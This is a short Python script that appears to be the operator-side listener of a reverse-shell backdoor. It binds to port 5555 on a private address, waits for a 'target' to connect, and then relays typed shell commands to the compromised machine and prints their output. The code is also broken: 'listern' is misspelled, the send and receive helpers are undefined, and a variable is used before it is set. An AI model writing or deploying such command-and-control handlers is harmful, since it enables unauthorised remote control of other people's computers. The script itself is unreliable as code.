import socket


def target_communication():
    while True:
        command = input("* Shell~%s" %str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        else:
            result = reliable_recv()
            print(result)



sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.100.210', 5555))
print("[+] Listerning for in comming connection ...")
sock.listern(5)
target , ip = sock.accept()
print("[+] Target connected from :"+ str(ip))
target_communication()